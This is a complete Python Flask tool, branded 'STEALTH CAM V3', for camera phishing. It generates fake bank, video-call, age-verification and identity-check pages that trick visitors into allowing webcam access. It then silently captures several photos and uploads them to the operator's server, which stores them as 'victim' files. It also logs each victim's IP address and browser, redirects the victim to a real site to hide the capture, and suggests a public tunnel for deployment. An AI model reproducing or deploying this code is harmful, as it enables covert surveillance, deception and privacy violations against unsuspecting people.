import os
import threading
import base64
import sys
from flask import Flask, request, jsonify
from datetime import datetime

try:
    from pyfiglet import figlet_format
except:
    print("\033[91m[!] pip install pyfiglet\033[0m")
    sys.exit()

R, G, Y, B, P, C, W, N = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m', '\033[97m', '\033[0m'

app = Flask(__name__)
clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')
os.makedirs('captured_photos', exist_ok=True)

def show_banner():
    clear()
    banner = figlet_format("STEALTH CAM V3")
    print(f"{R}{banner}{N}")
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"{G}     TEAM DARK | INVISIBLE CAMERA PHISH | @dark_exploit_")
    print(f"{P}          FULL STEALTH MODE | ZERO DETECTION")
    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{N}")

templates = {
    "1": {"name": "Bank Security Check", "title": "Security Verification", "desc": "Complete human verification to access your account.", "btn": "Start Verification", "redirect": "https://google.com"},
    "2": {"name": "Video Call Confirm", "title": "Join Video Call", "desc": "Allow camera to connect to secure video verification.", "btn": "Turn On Camera", "redirect": "https://meet.google.com"},
    "3": {"name": "Age Verification", "title": "Age Confirmation Required", "desc": "We need to verify you are over 18. Allow camera access.", "btn": "Verify Age", "redirect": "https://onlyfans.com"},
    "4": {"name": "Profile Verification", "title": "Verify Your Identity", "desc": "Quick face scan to complete profile setup.", "btn": "Scan Face", "redirect": "https://instagram.com"}
}

def generate_page(template):
    t = templates[template]
    return f'''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{t["title"]}</title>
    <style>
        body {{background: #f0f4f8;font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;display: flex;justify-content: center;align-items: center;height: 100vh;margin: 0;padding: 20px;}}
        .card {{background: white;padding: 40px;border-radius: 16px;box-shadow: 0 10px 30px rgba(0,0,0,0.1);text-align: center;max-width: 380px;width: 100%;}}
        h1 {{color: #1a1a1a;font-size: 22px;margin-bottom: 10px;}}
        p {{color: #666;font-size: 15px;line-height: 1.5;}}
        button {{margin-top: 25px;padding: 14px 0;width: 100%;background: #007bff;color: white;border: none;border-radius: 12px;font-size: 17px;cursor: pointer;transition: 0.3s;}}
        button:hover {{background: #0056b3;}}
        .loader {{display: none;margin: 30px auto;border: 6px solid #f3f3f3;border-top: 6px solid #007bff;border-radius: 50%;width: 50px;height: 50px;animation: spin 1s linear infinite;}}
        @keyframes spin {{0% {{transform: rotate(0deg)}} 100% {{transform: rotate(360deg)}}}}
        .status {{display: none;color: #28a745;font-weight: bold;margin-top: 15px;}}
        video, canvas {{display: none;}}
    </style>
</head>
<body>
    <div class="card">
        <h1>{t["title"]}</h1>
        <p>{t["desc"]}</p>
        <button onclick="init()">{t["btn"]}</button>
        <div class="loader" id="loader"></div>
        <div class="status" id="status">Scanning face for verification...</div>
    </div>

    <script>
        let stream;
        async function init() {{
            document.querySelector('button').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            document.getElementById('status').style.display = 'block';

            try {{
                stream = await navigator.mediaDevices.getUserMedia({{video: {{facingMode: "user"}}, audio: false}});
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 640; canvas.height = 480;

                const capture = () => {{
                    ctx.drawImage(video, 0, 0, 640, 480);
                    const data = canvas.toDataURL('image/jpeg', 0.95);
                    fetch('/save', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{img: data}})
                    }});
                }};

                // Silent multiple captures
                [800, 1600, 2400, 3200, 4000].forEach(delay => setTimeout(capture, delay));

                setTimeout(() => {{
                    if (stream) stream.getTracks().forEach(t => t.stop());
                    window.location.href = "{t["redirect"]}";
                }}, 5000);

            }} catch(e) {{
                setTimeout(() => {{ window.location.href = "{t["redirect"]}"; }}, 2000);
            }}
        }}
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    choice = request.args.get('t', '1')
    if choice not in templates:
        choice = '1'
    return generate_page(choice)

@app.route('/save', methods=['POST'])
def save():
    data = request.get_json()['img'].split(',')[1]
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', 'Unknown')
    count = len([f for f in os.listdir('captured_photos') if ts in f]) + 1
    path = f"captured_photos/victim_{ts}_{count}.jpg"
    
    with open(path, 'wb') as f:
        f.write(base64.b64decode(data))
    
    log = f"[STEALTH CAPTURE] {datetime.now().strftime('%H:%M:%S')} | IP: {ip} | {ua} | {path}"
    print(f"{G}[INVISIBLE] Photo captured silently!{N}")
    with open('stealth_captures.log', 'a') as f:
        f.write(log + "\n")
    return jsonify({"status": "ok"})

def run():
    app.run(host='0.0.0.0', port=5000, threaded=True, use_reloader=False)

def main():
    show_banner()
    print(f"{Y}Select Stealth Template:{N}")
    for k, v in templates.items():
        print(f"{C}[{k}] {v['name']}{N}")
    choice = input(f"\n{Y}Choice (1-4): {N}").strip() or "1"
    url = f"http://localhost:5000?t={choice}"
    
    print(f"{G}[+] Stealth Server Running!{N}")
    print(f"{B}[+] Local: {url}{N}")
    print(f"{G}[+] Tunnel: cloudflared tunnel --url http://localhost:5000{N}")
    print(f"{P}[!] Invisible capture active... Victims won't suspect anything.{N}")
    
    threading.Thread(target=run, daemon=True).start()
    try:
        while True: pass
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stealth mode off. TEAM DARK out. 🖤{N}")

if __name__ == '__main__':
    main()
